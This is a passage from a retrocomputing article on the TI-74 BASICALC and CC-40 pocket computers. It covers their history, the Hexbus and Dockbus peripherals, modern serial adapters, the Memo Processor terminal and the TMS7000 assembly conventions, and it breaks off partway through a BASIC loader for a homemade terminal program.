and pocketable \u2014 form. This is one of my two units with its box and the printer accessory.\\nAlthough the TI-74 was introduced shortly before the high-end $200 TI-95 PROCALC in 1986, the PROCALC is nearly the same hardware, just with the 31-character display divided into two lines (one 16-character general line and five three-character function key descriptions on the second). It can accept the same peripherals and much of what I'll talk about in this history section applies to it, but it is not programmable in BASIC and is closer in feel and operation to the earlier TI-59 which it was positioned to succeed. While it is legitimately a member of the CC-40 family, I won't talk a great deal more about it in this specific article.\\nUnlike the CC-40, the TI-74 comes with its own clamshell hard case, and it uses 4 AAAs instead of AAs to make it even lighter. This one is serial #0001989 with a manufacture date of May 1987 (I-0587).\\nThe TI-74 has only two ports. Like the CC-40 there is a cartridge slot, and like the CC-40 it can take ROM programs on cartridge as well as RAM expanders, though CC-40 ROMs don't work as is on the TI-74. Instead of the sliding top to expose the CC-40 cartridge's card edge, however, the male card edge is hidden in the cartridge slot and the cartridge actually has a female connector. Cartridges can be inserted and removed while the TI-74 is in the hard case (with the lid open).\\nThe other port is a 10-pin (instead of 8-pin) I/O connector that the manual calls \"Dockbus.\" Once the TI-74's provenance was discovered, however, word quickly got around the CC-40/TI-74 community that Dockbus ... is just Hexbus with some extra pins, meaning existing Hexbus devices can be connected to the TI-74 with a simple passive converter.\\nThe trick here is that two of the Dockbus lines are for power, both for the TI-74 to power connected peripherals and for a common supply\\nfrom\\na peripheral to power the TI-74. Like\\nthe Convergent WorkSlate\\n, which had a similar feature, these pins allow peripherals to share power with the computer. They obviously should not be connected to a CC-40 Hexbus device, nor the Dockbus-specific reset line. TI wisely keyed this connector to avoid letting out any magic smoke.\\nDockbus also has a little known \"user mode\" where, with two control lines placed in a recognized unusual configuration, an application can drive the four data lines directly to a device that knows how to communicate in this mode. As a consequence of the specification, compliant legacy Hexbus devices on the bus will ignore bus traffic when this mode is active. Dockbus user mode avoids nearly all of the Hexbus packet overhead and allows real-time signaling, but necessarily completely monopolizes the bus, and isn't supported by any of the classic Hexbus peripherals.\\nAs an example, the PC-324 Dockbus thermal printer shown here (device 12) has a port for an AC adapter \u2014 which is just our old friend the AC 9201. When AC adapter is connected to the printer, and the printer is connected to the TI-74, then the adapter can power the printer and the printer can power the computer as well (so TI eliminated the AC adapter port on the TI-74). The printer is also capable of running on its own set of AA batteries.\\nA reduced family of peripherals were offered for the TI-74. The PC-324 printer was now the star of the show, to which the CI-7 cassette interface could also connect for power (or directly to the TI-74), and both devices would also work with the TI-95. The CI-7 actually relies on the non-standard Dockbus \"user mode\" and thus won't work with the CC-40.\\nIn the initial rollout the PC-324 and CI-7 were the only two peripherals; there was never an RS-232 option. The TI-74 also had its own improved version of the 8K Constant Memory battery-backed RAM cartridge (there was likewise no 16K version, and a 32K version was never released). The ROM usefully added support directly to BASIC for saving but also\\nswapping\\nRAM with the cartridge, and although it still carried its own backup lithium cell, as long as it was plugged in this cartridge could also draw power from the TI-74's batteries to avoid draining the lithium battery \u2014 even if the calculator was turned off. Finally, some of the CC-40's software packages were upgraded and ported to the TI-74, here initially the Statistics, Mathematics and Pascal cartridges, and later Finance and a BASICALC-specific Chemical Engineering cartridge. Some of these packages were also ported to the TI-95.\\nIn 1989 TI introduced a new Dockbus peripheral for the TI-74 and TI-95, the PC-IF PC Interface. This device could connect to a DOS-based server on a standard PC via the PC's parallel port and exchange files with it for much faster performance than tape. It could also use the PC as a display terminal through the same server program, eliminating the need for the Hexbus video box. The PC-IF became a very popular accessory and the general concept has been expanded,\\nculminating in today's TIIF2\\n, though sadly the software is not open-source.\\nFinally, we'll crack it open to find the internals have become even more consolidated. The keyboard/LCD board is beneath this CPU board as before, but the CPU is now a 70C46 (ROM code C70009, here with a date code indicating 14th week 1986) and the functions of the CC-40's ASIC were built-in to the 70C46 except for the piezo beeper, which was removed. The CPU is slightly downclocked from the CC-40's 70C20, using a 4MHz crystal divided down for a clock speed of 2.0MHz, likely to save battery power given the smaller-capacity AAAs. Otherwise, there is a single HM6264 static RAM to provide 8K, and the 32K HN61256 system ROM. Apart from the usual HD44780/44100 combo driving the LCD, the custom CPU handles everything else, even the Dockbus.\\nThe TI-74 (and TI-95) turned out to be very long-lived members of TI's calculator line and at least two updated versions of the TI-74 exist, confusingly named the TI-74S and the TI-74 S (note space between 74 and S). The S variants are application-specific TI-74s intended to be used with custom cartridges which can be field-programmed with an adapter and some even UV-erased. The original TI-74 is limited to a total of 16K between the on-board memory and cartridge memory, even if the RAM cartridge is larger than 8K; TI updated the TI-74S firmware to autorun an attached cartridge and to support up to 16K additional memory to BASIC (for 24K).\\nIn 1988\\nTI updated the TI-74S ROMs to support 32K RAM cartridges for a maximum total in BASIC of 40K, yielding the TI-74 S with a space. These later units can also be distinguished by their manufacturing dates, and since the change to maximum RAM is in software, it is possible to patch earlier units with a small assembly routine or replace their ROMs to do the same.\\nThe TI-74 family remained available well into the early 1990s until it was discontinued around 1992, marking the end of the CC-40 and its descendants, and the end of our history. All that was to get you the context to understand the similarities and the differences between these machines, which will become very important a little later on. Let's get our CC-40 and TI-74 communicating with the outside world, and to do that we should start with the peripherals \u2014 old and new.\\nCommunication options with Hexbus\\nDuring the CC-40's days on the market, officially there were exactly two Hexbus peripheral options to allow it access to the outside world: the HX-3000 RS-232 box and the HX-3100 300bps modem. The RS-232 box could of course be connected to a separate external modem, but the Hexbus modem itself did not require the RS-232 box to function.\\nThe RS-232 box, on top, has a female DB-25 port, AC adapter port (again using the AC 9201) and twin Hexbus ports for daisy-chaining. As I mentioned earlier when we looked at its innards, the deluxe HX-3000/P version has a ribbon cable sticking out the back with a DB-25 parallel port. This passive cable goes to a set of pin headers inside and can be secondarily added. While hardly any modern computers come with real serial ports anymore, let alone DB-25s, a \"DB-9\" (DE-9) female to DB-25 male converter cable like the StarTech AT925FM will give you a port that most USB serial adapters will directly connect to.\\nThe modem, on the bottom, has a telephone connection switch, RJ-11 phone jacks (one for your line, one for your handset, since the modem can't dial), and also a set of Hexbus ports. The connection switch is not for answer/originate, as is typical with many non-Hayes 300bps modems where\\nthe right modulation\\nhad to be manually selected; rather, this switch is for whether the modem is listening to the line. To make a call, a user would set the switch to OFF, manually dial the remote system with their telephone handset, wait for the answer tone, and then flip the switch to ON.\\nDespite this, however, the modem is still an intelligent device \u2014 just not with AT commands. My unit here appears to be an early production device and has what looks like a pre-production CPU marked \"11006.\" This is in fact a TMS70C20A2NL, a revised but functionally equivalent version of the TMS70C20, downclocked to a slower 1.536MHz speed from a 3.072MHz crystal. Settings like answer/originate are controlled in software, which the CPU uses to configure the TMS99532 next to it, basically a 300bps Bell 103 modem on a chip. This chip uses a 4.032MHz crystal. The only other major IC is of course another 1052911 handling Hexbus traffic.\\nIn fact, this particular HX-3100 modem is early enough that it lacks a bottom label, having only a serial number (#0000319) and manufacturing date (34th week 1983). But the biggest difference from the RS-232 box (serial #0001962, produced 49th week 1983) is that the modem can run on AC\\nor\\nbatteries: the TMS99532 pulls less juice than the 6551 ACIA and the modem's CPU runs at a slower clock speed, so unlike the RS-232 unit the modem can be truly portable. On the other hand, the RS-232 box would have most likely been connected to devices that weren't battery-powered either, so this isn't really a major flaw.\\nWe won't talk further about the modem here, though it's certainly better than nothing, and since it doesn't require a dial tone you can have it manually answer any other compatible 300bps modem to exchange data using just an RJ-11 phone cord (\\nyour Commodore 64 can send data to it\\n, for example). However, the RS-232 unit is capable of running up to 19.2kbps thanks to its onboard ACIA, a very impressive speed for the time particularly with this class of computer, and far faster than the modem. We will be treating it as our gold standard device for comparison purposes.\\nUnfortunately, both the modem and the RS-232 box have the same problem: ain't nobody making them.\\nFortunately, the hobbyist community has since filled the gap and nowadays we have two main choices for Hexbus serial. While neither is perfect, both will work for the specific purposes in this article, though each has strengths over the other in various respects. Both connect to a host over USB using common serial drivers and can be bus-powered.\\nOn the left is the original,\\nJim Brain's HEXTIr\\n. This is an Arduino-based device implementing a serial printer port (device 10), RS-232 port (device 20), SD card reader for loads and saves (device 100) and a battery-backed real-time clock (device 230). It is open-source hardware and firmware and yours truly has contributed improvements in the past which are now part of the current firmware package. Because it is an open-source unit, it is occasionally offered for sale in small quantities by various third parties and this was one of those that I bought some years ago; it came with a separate 3-D printed enclosure.\\nOn the right is a newer entry, the\\nthe TI Hexbus Serial USB Adapter\\nby StarDust and sold by Jeff Birt/Soigeneris, which I'll refer to as the \"StarDust adapter.\" It offers two serial ports, one with an on-board DB-25 and the other via USB (devices 27 and 26, respectively), and has multiple Hexbus connectors and a Dockbus connector. It is not an open-source design (I've asked), but is sold and supported as a commercial product, and comes to you fully assembled with an enclosure of its own and ready to use. This device is particularly unique in that it has a basic configuration interface accessible as device 200, plus a simple console shell on either serial port. However, although it can also load and save files, this functionality requires a additional BackPack drive be connected to the DB-25 (as device 100) which is sold separately and requires its own battery.\\nExternally, the biggest difference is the connectors. Besides the USB-B jack, barrel power jack and SD card slot, the HEXTIr has a real male Hexbus port that you connect standard female-female Hexbus cables to. Depending on who made it (you?), this port may be unkeyed, so I wrote the orientation on the bottom in silver Sharpie ink. If you don't have Hexbus cables (whereas I have several, including a nice generous long one perfect for this purpose), you could probably just use a bundle of jumper wires, though this might be inconvenient on the CC-40's end.\\nThe StarDust adapter goes a different way, besides using a micro-B USB jack: it uses 8-pin IDC connectors which are much more widely available, and it provides two of them allowing multiple devices to be connected. Soigeneris sells you cables to connect to these along with the necessary adapters. You'll need some to connect it to a CC-40, but the StarDust adapter is best paired with the TI-74 because it has built-in Dockbus and plugs directly into the port \u2014 it can even draw power from the Dockbus (switchable) if not connected to a USB source. If you don't need to connect to anything else, it can go right into a TI-74 and offer basic functionality straight from the shipping envelope.\\nInternally this particular HEXTIr is based on a clone Arduino Uno R3, though the firmware can run on anything Arduino-like with an ATmega328 or 328P. Here the SD card, Hexbus port and RTC are provided by a modified Arduino Logging Shield with some extra wires and pin-headers soldered on; no additional parts are required. If you simply want to use it as an SD card drive, the barrel jack can provide power, or you can connect the USB to a regular USB charger. You can also\\nfabricate your own PCB\\n.\\nInterestingly, the StarDust adapter is also AVR-based, in this case a Microchip AVR64DD32. It comes on a custom PCB with various jumpers, the micro USB-B port, the two 8-pin IDC ports and the female DB-25, with the Dockbus connector on the reverse. In both the HEXTIr and the StarDust adapter the Hexbus-serial link is bitbanged by the AVR, which has some consequences we'll run into when it comes to throughput.\\nSince I of course have plenty of real Hexbus cables, the HEXTIr is the most convenient to attach to the CC-40, though I'll come back to the StarDust adapter when we get to messing with the TI-74. Here I connect it to my M1 MacBook Air with a USB-A to USB-C converter for the serial link and power. The CC-40 is being run on a power adapter.\\nWhen bringing up the CC-40 (or TI-74), if you have the Hexbus connected but the device on the other end isn't powered on, the computer will show its I/O indicator on screen and then stall out. Instead, both the HEXTIr and StarDust adapter will immediately power up when connected to USB, and then the computer can be turned on after that.\\nNow that we've met the hardware options, let's meet (one of) the software options. The CC-40 has a terminal program available on cartridge in combination with a simple word processor called Memo Processor. In my opinion this is one of the CC-40's truly essential cartridges and it (or a multicart) is usually plugged into mine. Document text is stored in the BASIC program space, so make sure you've saved any program you were working on \u2014 say, to the HEXTIr's SD card \u2014 before starting the cartridge.\\nThe key combinations for the Memo Processor are a bit arcane, but fortunately it comes with a nice spiral-bound manual (with the inevitable \"The Wafertape\u2122 Digital Tape Drive is not available\" insert) and two keyboard overlays we can place over the main keyboard and numeric keypad to help us. This overlay also tells us what the LCD indicator marks are meant to designate. The cartridge has a single program on it called\\nMP\\n, so we enter (as the overlay hints us)\\nRUN\"MP\"\\nto start it up.\\nMemo Processor (\"MP\") was written by a third-party, Telos Software Products, and sold by Texas Instruments under license. Telos Corporation was founded in Santa Monica, California in 1968\\ninitially as a federal systems integrator that did contract development for military and space applications; perhaps their most famous work during this time was as part of the NASA Voyager 1 team, working on the real-time telemetry and image processing systems used in the space probe's 1979 Jupiter and Saturn fly-bys. Voyager 1 is now the most distant man-made object from Earth, over 15.8 billion miles from home as of November 2025, and as of this writing valiantly continues its extended interstellar mission.\\nWith the advent of the microcomputer, even though a substantial percentage of its business remained government customers, Telos management started to steer the product line  towards personal computing in the early 1980s as a means of diversification. These initiatives were consolidated under two 1983 subsidiaries, Telos Computing and Telos Software Products,\\nwith the latter developing Memo Processor for TI. However, Telos Software Products became much better known for Filevision, a 1984 product for the then-new Apple Macintosh that presented a graphical means of designing databases by linking on-screen graphic objects with data stores. It sold briskly to rave reviews and in 1985 users were creating applications for it as diverse as airport layouts and airline routes, rabbit farm management, and the state of bills in the Florida legislature \u2014 all real entries in that year's contest. Filevision subsequently evolved into a larger version in 1986 called Business Filevision, but HyperCard became seen as a superior means for constructing such interfaces after it emerged in 1987 and gradually displaced it. Although the Software Products subsidiary was ultimately dissolved in 2002, its parent Telos Corporation remains in business today (presently in Ashburn, Virginia) and still primarily as a vendor to government entities, but now with an\\nemphasis on cybersecurity\\n.\\nMemo Processor starts up ...\\n... by default into the Word Processor mode, which is a line-oriented text editor. Many CC-40 owners used it for writing documents of non-trivial size and sending it to a larger computer via the serial port, though\\na subtle bug\\ncan cause data loss for documents with unusual total lengths when the machine is powered off, even if batteries or an AC adapter are used. It supports lines up to 80 characters and could print directly. The manual gives you a very precise formula for computing available space, indicating the 6K CC-40 could contain 3,071 bytes for a document and the 18K could have 15,359 (though note that TAB characters take up three bytes and everything else just one). This is still a substantial available portion of the internal RAM, so maybe TI was onto something counting ROM as \"memory\" even though I hate it. A document can be sent over the serial port, and activity from the serial port can be recorded into a new document.\\nThe MP has many key combinations. Key combinations can be entered either by holding down the modifier and pressing the key(s), or pressing the modifier once (the appropriate indicator will appear) and then pressing the key. The obvious ones are with SHIFT (highlighted in blue) and \"CTL\" (highlighted in maroon), but all the mode shifts are done with the FN key (highlighted in dark grey). Here we'll press FN-O (not zero) for the communication options page to make sure we are configured correctly. The settings page is only available while a connection is\\nnot\\nin progress, or otherwise you must \"hang up\" with FN-/ (forward slash).\\nThe communication options page lets you set the Hexbus device (supported 20-27 or 70-77 for the RS-232 and modem ranges), baud rate (officially 110 or 300), data bits (7 or 8), parity (N/S/M/O/E), check parity, duplex and stop bits (1 or 2). Despite allowing the modem range, however, the MP actually predates the HX-3100 modem and it appears nowhere in the manual (only modems attached to the RS-232 box).\\nFrom the keyboard overlay you'd get the idea that these are the only settings allowed, but in fact there is a hidden advanced settings page only mentioned parenthetically in the manual. When asked for the device number (i.e., at this prompt in the communications settings), press FN-Q instead, and you get a different prompt.\\nOn this somewhat super s3kr1t screen you can enter an entire device configuration string, the same as you'd use with a BASIC\\nOPEN\\nstatement. You could set, for example, the HX-3100's answer/originate switch this way (which isn't part of the options page), but more relevantly to us you can set other bitrates. This is how we can hook up an HX-3000 RS-232 box and run it at its full 19200bps \u2014 such as, in this picture, over a USB-serial adapter to the M1 MacBook Air. FN-Q also works for printer settings and is in fact required for early versions of the printer/plotter (change\\nR=N\\nto\\nC=N\\n).\\nI mentioned that the two modern devices both have throughput considerations. If you have a StarDust adapter, you may occasionally drop characters unless you move its console to the serial port you're not using (e.g., if you're connected over USB,\\nset console serial\\n), and all but the most recent firmware doesn't work right with the default 300bps. However, once the console is redirected it seems to run fine at 19200bps with the same settings as the HX-3000, using either device 26 or 27. (This is not true for the TI-74, but I'll get to that later.)\\nThe HEXTIr's firmware, on the other hand, has a very small receive buffer and to date I have not had success fixing this. While it might be better with a later CPU, this Uno R3 can only reliably work asynchronously at 300bps, and in that case the MP's default settings are best.\\nEither way, at this point you can now press FN-, (comma) and go online with your device.\\nAnd here we are, connected to the world (the other end is\\npicocom\\non the M1 MBA). In the manual, this mode is specifically advertised for contemporary time-sharing systems such as CompuServe and in particular TCA's\\nThe Source\\n, running on Dialcom Prime minicomputers and accessed via the Telenet nationwide packet-switched network. Both of these services provided typical features such as stock quotes, headline news, a reference library, shopping and E-mail. The manual also advertises Texas Instruments' own TEXNET (not to be confused with the current State of Texas electronic payment system) operated as an overlay on The Source, providing \"1200 services and programs\" such as an electronic newsletter, a nationwide listing of TI user groups and service centres, a listing of available software (but for the 99/4A, not the CC-40), and the TI Submit service which \"enables TEXNET users to submit software programs electronically to any of TI's software exchanges, including the International 99/4 Users-Group, Inc.\" TI planned to offer client software that would take advantage of the 99/4A speech synthesizer and its sound and graphics hardware, but this was never realized before the demise of the home computer line. Nevertheless, TI kept TEXNET in operation for several years even through the Reader's Digest buyout of The Source, revamping it in 1984 before decommissioning the service around 1987 due to the dwindling 99/4A user base. CompuServe subsequently bought out and shut down The Source completely in 1989.\\nIn terminal mode the MP presents a 31x1 window on an 80x24 virtual screen, though it implements no particular kind of terminal emulation, and even things like backspace and delete require control-key combinations (CTL-H and CTL-down respectively). XON/XOFF (CTL-S and CTL-Q) pause the display so that you can use the arrow keys to scroll, or FN-up/FN-down to jump to the top or bottom, or page the display with FN-S (FN-A to do so automatically).\\nThe MP behaves very curiously with Hexbus. In TI's original conception of how Hexbus-based systems would communicate over RS-232, everything was synchronous and done in record-based transactions, which fit the Hexbus packet model well. This is typically the way you would drive such devices from BASIC, and all known Hexbus RS-232 devices including the HEXTIr and StarDust support this and (except for the modem) at high speed. However, this type of operation doesn't work effectively at all for\\nasynchronous\\ncommunications like a dummy terminal, which was exactly the type of service link the MP was intended to support. Although the HX-3000 RS-232 box, and later the HX-3100 modem, are capable of interrupting the main computer when data has arrived \u2014 which should have made connections very fast and seamless \u2014 the problem is that when this happens, the computer only knows that an interrupt has occurred and not what caused it, and as we mentioned earlier is thus obliged to poll any and all enabled devices on the bus to find out. Depending on the configuration, this could be a rather slow process and as a result end up losing data.\\nSo the MP's solution is brute-force: it polls the bus incessantly, asking the selected device over and over if data has arrived and grabbing the response immediately if so. This shows up as the I/O indicator flickering non-stop on the LCD and the amber LED on the modem or RS-232 box remaining lit while on-line. This behaviour solves the data problem, which is the most critical, but at the price of reduced battery life and a lot more inefficient Hexbus traffic. It's also really rough on the HEXTIr and StarDust adapters which must bitbang Hexbus and serial in software at the same time (unlike the HX-3000 with its own dedicated ACIA and bus transceiver). Still, this method is the least unreliable way to run a terminal program the way Hexbus is implemented, at least for the CC-40 family.\\nMemo Processor suffices for the CC-40 itself, but the TI-74 doesn't have a terminal program of any sort that I know of. TI likely intended the PC-IF to handle this role. That seems unnecessary.\\nThe first? terminal program for the TI-74 BASICALC\\nI'm going to stake a claim to being the author of the first terminal program for the BASICALC, but TI doesn't make it easy. It's just not possible to drive Hexbus at high speeds from BASIC on the CC-40 and this goes double for the TI-74 where the CPU is downclocked, so now we need to turn to assembly language. Let's talk more about the TMS7000 series of processors.\\nTypical of early 8-bit architectures, the TMS7000 family has very few canonical registers, although it also notably lacks a typical accumulator. Instead, it uses its internal RAM like a mashup of the 9900/9995 and the Intel 8051: its RAM maps to the lowest page in memory (either $00-$7f or $00-$ff depending on the specific variant) with most instructions referencing them as 128 or 256 individual 8-bit registers (R0-R255) or 64 or 128 16-bit pairs. This is analogous to IRAM in the 8051 or zero page in the 680x/6502, though registers 0 and 1 are also specially aliased to \"accumulators\" A and B in certain addressing modes, and the instruction set is not highly orthogonal. The internal RAM is also used for the stack, referenced by an 8-bit stack pointer; apart from that, an eight-bit status register and 16-bit program counter are the only other true registers. Unlike the Harvard architecture of the 8051, the 7000 family is von Neumann, so the internal ROM occupies the same address space. In the CC-40 the TMS70C20's internal ROM is 2K, while in the TI-74/95 the TMS70C46's internal ROM is 4K. The TMS7000 family is fundamentally, even aggressively, big-endian and this has consequences we'll discuss shortly.\\nAs with any microcontroller, the chips have substantial built-in I/O facilities realized as timers and ports. These onboard peripherals are handled as memory-mapped I/O from $0100-$01ff as the \"peripheral file\" and referenced as P0-P255 by specific instructions. Both the CC-40 and TI-74/95 CPUs have a single timer controlled in this range, but the CC-40 TMS70C20 has 32 I/O lines (eight inputs, eight outputs, 16 bidirectional) while the TI-74/95 TMS70C46 has eight more bidirectional lines explicitly dedicated to servicing Dockbus/Hexbus. Because the I/O lines overlap with the address and data lines, some number of them are lost when accessing off-chip resources. In these machines both microcontrollers run in what the data sheet refers to as \"full expansion\" mode, where external resources (RAM in this case) are available between $0200 and the bottom of internal ROM at the top of the addressing space. Twenty I/O pins are reserved for the multiplexed address and data busses in this mode, leaving eight inputs and four outputs (and the TMS70C46's eight additional bidirectional lines) uncontended, plus the single timer. Four levels, six in certain members, of interrupt priority are available. This range is where the CPU controls the bus, beeper (CC-40 only), battery sense, keyboard and LCD.\\nThe precedessor TMS1000 family had landed many design wins as an ultra-low-cost microcontroller (\\nsuch as in games\\n), shipping close to 100 million units over its lifetime,\\nand TI wanted to preserve what it perceived had made it popular. Like the TMS1000, the TMS7000 family is heavily microcoded, and TI specifically advertised (again like the TMS1000) that developers could alter the microcode to best suit their purposes. A manufacturer could submit both their desired microcode and mask ROM contents and get back a big bunch of cheap, capable chips ready to send to the factory. However, also like the TMS1000, few users of the TMS7000 developed their own microcode \u2014 instead, what ended up winning over developers was its price-performance ratio, which turned out to be excellent. Besides efficient bit-test instructions, it also directly supported BCD math (making it useful for calculators and cash registers) and had an extremely fast 8x8 hardware integer multiplier, and its code density allowed ROM usage to be anywhere from 30-45% less. Although its instruction cycle count was no match for non-microcoded processors like the MOS 6502, the TMS7000 made up for this with its flexibility and much faster clock speeds, and most of its putative competition (e.g., the Motorola 6801, Zilog Z8, Intel MCS-51) had the same drawbacks. Combine that with its ready availability in large quantities, and TI had a winner.\\nAs a result, the TMS7000 family was a competitive microcontroller option during the 1980s and even early 1990s, appearing in many diverse applications such as point of sale terminals, handheld games (MAME emulates the Tiger Punch Your Lights Out), peripheral controllers (like the keyboard in the Olivetti M24), pinball machines (the audio controller in\\n68K-based Technoplay pins\\n) and one-armed bandits, or pokies as my wife would call them. In fact, my parents' first burglar alarm was a TMS7000-based system because I remember looking at the circuit board while Dad was installing it and noticing it had a TMS7-something as the CPU (I think a TMS70C20 but that was many years ago and it was ripped out since). This stuck in my memory because as a kid I had recently cracked open my Tomy Tutor and wondered if its TMS9995 was related (they're not).\\nIndeed, one place the TMS7000 was\\nnot\\nfound much was in standalone microcomputers. Its instruction set was incompatible with everything else, even TI's other CPU lines, and its advantages in embedded systems didn't really translate to general purpose machines. A rare exception was the French Exelvision EXL 100 and EXELTEL home computers, another competitor for the French\\nPlan Informatique pour Tous\\n(\"Computing for All Plan\") \u2014 compare with\\nthe Thomson MO5\\n\u2014 that saw limited use in French schools. The use of TI chips in the Exelvision family was largely because Exelvision consisted primarily of former TI employees, and their CPUs are one of the uncommon ones with custom microcode to accelerate their custom VDP. Otherwise, aside from TI's own development SBCs, the closest thing most of us will get to a TMS7000-powered computer are our twin friends here.\\nTI provided many development resources for creating TMS7000 systems, including full-blown\\nevaluation systems\\nwith in-circuit emulation, and much software for writing programs. Since those development systems are rare and the CC-40 Editor/Assembler cartridge was stillborne, many of the tools modern homebrewers use come from TI's own TI-74 SDK (which can be adapted for the CC-40), some of which is proprietary and difficult to find, and others from the TI-74 PC-IF package, which are closed source and must run in MS-DOS but are easier to track down. For expediency I have elected to use one of those tools, though with a little help we won't need to dig out an old PC or shoehorn it into DOSBox.\\nDue to various implementational choices and the TMS7000's own strong big-endian orientation, one feels like you're coding in a mirror when working with these two machines. The stack is at the bottom of memory and grows up (compare with, say, the Motorola 6800 which is also big-endian but has a 16-bit stack pointer growing down), and instructions referencing a register pair X operate on addresses X-1 (MSB) and X (LSB), not X (MSB) and X+1 (LSB). To save space on loops that must frequently test for equality, the operating system tends to put everything at high addresses working down to low (so testing the end condition just means a decrement and looking at the processor's zero flag). This idiom was specifically catered to in the instruction set and obligatory for achieving the highest code density, so buffers and strings are usually stored in reverse order in memory, and programs are often loaded at the top of a given range.\\nFor reasons which will become very clear, I found it most straightforward to create the terminal program for the TI-74 on the CC-40 first, and this also gives CC-40 users without the Memo Processor cartridge an alternative as well. In this picture you can see the nest of wires and bus lines on my work table with the HEXTIr and StarDust adapters daisy-chained over Hexbus. Yes, they coexist together just fine since their device numbers largely do not conflict (the HEXTIr's SD card slot is the sole device #100 as there is no BackPack drive connected to the StarDust) and both appear as different serial ports to the MacBook Air.\\nThe CC-40, and subsequently the TI-74 and TI-95, has a very modular operating system. The 2K internal mask ROM in the TMS70C20, which maps to $f800-$ffff, contains the lowest level reset code and system control drivers. However, the 32K BASIC ROM, which contains BASIC and the rest of the OS' higher level calls, is only banked in with 8K blocks (at $d000-$efff). This allows sufficient space for any installed cartridge's ROM or RAM ($5000-$cfff), portions of which can also be banked in and out if needed. The low 2K system RAM appears at $0800, and then BASIC text starts at $1000 up to $1fff (6K) or $4fff (18K); the address range $0200-$07ff is otherwise unpopulated. One of the very important routines in the CC-40's 2K ROM is\\nCALPAG\\n, a routine that takes a page number (0-3) in A and routine number in B, banks in the appropriate page, and makes the call. The vast majority of system calls on the CC-40 and TI-74/95 must be called through this routine; even in the 4K mask ROM of the TI-74/95 only a minimum number of system routines are always accessible. Another major routine in high ROM would be\\nIOS\\n, used for commanding devices through the I/O subsystem. In our case, this will be our Hexbus serial ports.\\nBecause the TI-74 descends from the CC-40 Plus, substantial portions of the two systems' firmware are not only compatible but practically identical, even down to their usage of internal RAM registers. Most of the same calls also exist on both systems, but the calling\\nconvention\\nis where the most critical difference lies. To incorporate cassette support, and later the extra calculator math routines, not even the extra 2K of ROM in the TMS70C40 (on which the TMS70C46 is based, not the TMS70C42) turned out to be enough to accommodate it. TI solved this problem in two ways. The first was to gut the system ROM, tossing out features not deemed germane to its primary purpose as a calculator such as the internal debugger and direct memory access. This, plus convenience, is the main reason we're writing the proof-of-concept on the CC-40 first.\\nThe second way TI squeezed everything in was to change the way routines are called. A\\nCALPAG\\n-assisted call on the CC-40 looks something like this (using canonical TI assembler syntax):\\nmovd %&gt;0036,b","text":"<pre><code>call &gt;f836\\nor, as I prefer to write it since this is slightly faster and takes up the same number of bytes (seven),\\nmov %&gt;00,a\nmov %&gt;36,b\ncall &gt;f836\\nboth of which will call the\\nDSPCHR\\nroutine in the BASIC ROM. This routine expects a character in $5c and writes it to the screen in character position $53. (Notice that the 16-bit\\nmovd\\nis to B, not A, because 16-bit operations work with X-1 as the MSB and X as the LSB.) On the TI-74, the register usage is the same, but the call stanza is markedly shorter:\\ntrap 20\nbyte 18\\nThis is just\\ntwo\\nbytes to make the same call, a savings of 71% (!). The\\ntrap\\ninstruction pushes the program counter like any other subroutine call and pulls the destination address from vectors at $ffd0 (stored, you guessed it, backwards), all in a single byte and in the same cycle count as\\ncall\\n. Although the\\ntrap\\ninstruction is legal and exists on the TMS70C20 also, TI made the heaviest use of it here, though not all system calls were converted to traps. It is therefore feasible in our cross-assembled source to have assemble-time defines to select either the CC-40 or TI-74 calling convention (such as different macros), yet have most of the core assembler source be otherwise the same. This can be used to build both versions off a single source file and that's exactly what we've done.\\nTo actually run our program, we'll need to get into memory, and we'd prefer not to have to deal with creating a cartridge ROM (perhaps in\\na future article\\n) \u2014 ideally it should be something we can type in or load from an SD card or a BackPack drive. Happily, this task is greatly facilitated by the various memory management subprograms in CC-40 BASIC, meaning we can just create a BASIC loader and have it store everything in RAM. TI BASIC in its various forms is unusual for its heavy reliance on subprograms, which are separate modules (usually in a low-level language like assembly or 99/4 GPL, but also supported in CC-40 BASIC with the\\nSUB\\nkeyword) activated with the\\nCALL\\nkeyword, like\\nCALL CHAR\\nto redefine the shape of a character. (Even Tomy Tutor BASIC has subprograms internally, being descended from TI Extended BASIC, though you can't create more and Tomy wisely eliminated the need for the\\nCALL\\nkeyword.) CC-40 cartridges can even provide subprograms of their own for immediate use with BASIC.\\nThe relevant subprograms for our task here are\\nCALL GETMEM\\n,\\nPOKE\\n(and if needed\\nPEEK\\n),\\nEXEC\\nand\\nRELMEM\\n.\\nCALL GETMEM\\nis basically\\nmalloc()\\n, accepting a request to reserve a certain amount of bytes of memory and returning the address where it was allocated;\\nCALL RELMEM\\nis, analogously,\\nfree()\\n. Once the memory is reserved, we can\\nCALL POKE\\nto populate it, taking advantage of the fact it allows storing multiple values in one statement, and then run the program with\\nCALL EXEC\\n. Here's the finished product for the CC-40. It is indeed short enough that you can just key it in, if you want, or you can get\\nCCATRM.PGM\\nfrom\\nthe Github project\\nand run it from the HEXTIr or BackPack (e.g.,\\nRUN\"100.CCATRM.PGM\"\\n).\\n99 PRINT\"Connecting\":OPEN #1,\"20.B=300,D=8,P=N,S=1,E=N,R=N,T=C,E=N\"\n</code></pre> <p>100 CALL GETMEM(262,XBADDR) 110 CALL POKE(XBADDR,6,114,20,70,114,3,69,213,68,136,9,29,60,213,67,213,66,136) 120 CALL POKE(XBADDR+18,0,30,65,213,73,213,63,224,116,213,63,213,62,213,61,34) 130 CALL POKE(XBADDR+34,0,82,57,142,248,54,93,0,230,69,114,4,69,114,1,63,18) 140 CALL POKE(XBADDR+51,92,45,230,226,86,45,231,226,82,45,13,226,24,45,234,226) 150 CALL POKE(XBADDR+67,16,45,250,226,8,45,246,230,14,34,127,224,10,34,8,224) 160 CALL POKE(XBADDR+83,6,34,13,224,2,34,10,139,9,29,136,0,70,118,181,142,248) 170 CALL POKE(XBADDR+100,75,125,0,61,226,7,34,0,82,93,142,248,54,114,3,69,213) 180 CALL POKE(XBADDR+117,63,213,61,213,73,136,0,70,118,181,142,248,75,125,0) 190 CALL POKE(XBADDR+132,61,230,148,125,0,63,230,5,224,141,10,224,39,77,73,63) 200 CALL POKE(XBADDR+148,230,15,213,83,136,9,60,89,34,0,82,30,142,248,54,224) 210 CALL POKE(XBADDR+164,231,34,30,211,73,50,73,106,192,170,9,0,45,13,226,4) 220 CALL POKE(XBADDR+180,45,10,230,17,114,30,74,82,31,34,32,194,171,9,30,93) 230 CALL POKE(XBADDR+196,0,230,248,224,200,45,8,226,43,45,127,226,39,50,74,230) 240 CALL POKE(XBADDR+212,28,208,72,82,29,170,9,30,195,171,9,30,93,1,226,4,194) 250 CALL 